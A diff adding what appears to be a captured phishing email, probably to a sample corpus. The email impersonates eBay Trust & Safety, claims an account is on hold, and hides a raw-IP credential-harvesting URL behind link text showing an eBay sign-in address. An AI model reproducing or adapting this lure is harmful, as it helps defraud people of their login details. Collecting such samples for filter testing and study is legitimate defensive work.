@@ -1,0 +1,49 @@
+From nobody Sun Jan 25 13:50:03 2015
+Return-Path: <Security@ebay.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+ by example.com (Postfix) with ESMTP id E40EB46950;
+ Tue,  8 May 2007 05:50:22 -0400 (EDT)
+X-Greylist: delayed 26411 seconds by postgrey-1.27 at mail.example.org;
+ Tue, 08 May 2007 05:50:22 EDT
+Received: from mail.com (unknown [199.227.16.244])
+ by mail.example.org (Postfix) with SMTP id 6F231131F847;
+ Tue,  8 May 2007 05:50:22 -0400 (EDT)
+From: "eBay" <Security@ebay.com>
+Subject: Your eBay Account Has Been Placed On-hold Action Required
+Date: Tue, 8 May 2007 05:50:26 -0400
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20070508095022.6F231131F847@mail.example.org>
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 1232
+
+<P>
+<TABLE cellSpacing=0 cellPadding=5 width="100%" border=0>
+<TBODY>
+<TR>
+<TD noWrap width="1%"><IMG alt=eBay src="http://pics.ebaystatic.com/aw/pics/au/logos/ebay_95x39.gif" border=0></TD>
+</TR></TBODY></TABLE>
+<TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#ffe680 border=0>
+<TBODY>
+<TR>
+<TD vAlign=top width=8><IMG height=8 src="http://pics.ebaystatic.com/aw/pics/globalAssets/ltCurve.gif" width=8></TD>
+<TD vAlign=bottom width="100%">
+<H1 style="MARGIN-TOP: 2px; FONT-WEIGHT: bold; FONT-SIZE: 14pt; MARGIN-BOTTOM: 2px; COLOR: #000000; FONT-FAMILY: arial,"><FONT face="Arial, Verdana" size=4><B>ACCOUNT ON-HOLD: Please complete the verification process</B></FONT> </H1></TD></TR></TBODY></TABLE></P>
+<P>Dear Coustomer, </P>
+<P>Sometimes eBay accounts are used to send email solicitations for transactions outside of eBay, or to send unrelated questions in an attempt to discover your email address. We wanted you to be aware of the potential fraud risk these solicitations pose and encourage you to ignore the email you received from this member. Sales that take place outside of eBay are not eligible for any eBay or PayPal protective services and you run the risk of losing your money or your item if you complete these transactions. </P>
+<P>Our records indicate that you recently interacted with other ebay members through the eBay email system and your account need verification. To speed up this process, you are required to verify your personal information against the account registration data we have on file by following the link below.</P>
+<P><A href="http://64.226.55.213/.www.ebay.com/Member/SignIn/ws2/eBayISAPI.htm">https://signin.ebay.com/ws/accountprotection/eBayISAPI.dll?SignIn&copartner.html</A>&nbsp; </P>
+<P>As a reminder your account may be restricted from buying or selling. </P>
+<P>Regards, </P>
+<P>eBay Trust &amp; Safety</P>
